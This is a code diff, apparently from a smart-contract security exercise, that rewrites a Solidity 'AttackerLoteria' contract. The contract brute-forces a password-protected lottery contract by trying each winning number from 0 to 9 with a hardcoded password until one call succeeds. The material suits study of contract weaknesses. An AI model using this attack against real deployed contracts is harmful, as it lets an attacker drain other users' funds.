@@ -70,34 +70,31 @@ contract LoteriaConPassword {
 //     function attack(address _sc) public payable {}
 // }
 
-contract AttackerLoteria {
-    address public loteriaAddress;
-    uint8 private correctPassword;
+interface ILoteriaConPassword {
+    function participarEnLoteria(uint8 password, uint256 numeroGanador) external payable;
+}
 
-    constructor(address _loteriaAddress, uint8 _password) {
-        loteriaAddress = _loteriaAddress;
-        correctPassword = _password;  // Correct password must be provided
+contract AttackerLoteria {
+    ILoteriaConPassword public loteria;
+    uint8 private constant PASSWORD = 1; // Establece el password correcto aquí.
+
+    // Setter para la dirección de LoteriaConPassword
+    function setLoteriaAddress(address _address) public {
+        loteria = ILoteriaConPassword(_address);
     }
 
     function attack() public payable {
         require(msg.value >= 1500, "Insufficient funds for the attack");
 
-        LoteriaConPassword loteria = LoteriaConPassword(loteriaAddress);
-
-        // Since winning number is %10, we try all from 0 to 9
+        // Intentar ganar la lotería con diferentes números
         for (uint256 i = 0; i < 10; i++) {
-            try loteria.participarEnLoteria{value: 1500}(correctPassword, i) {
-                // If the transaction does not revert, it could be a winning bet
+            try loteria.participarEnLoteria{value: 1500}(PASSWORD, i) {
                 break;
             } catch {
-                // Continue trying if not successful
+                continue;
             }
         }
     }
 
-    // Function to receive Ether when winning the lottery
     receive() external payable {}
-
-    // Helper function to fund this contract with enough Ether
-    function fundAttacker() public payable {}
 }
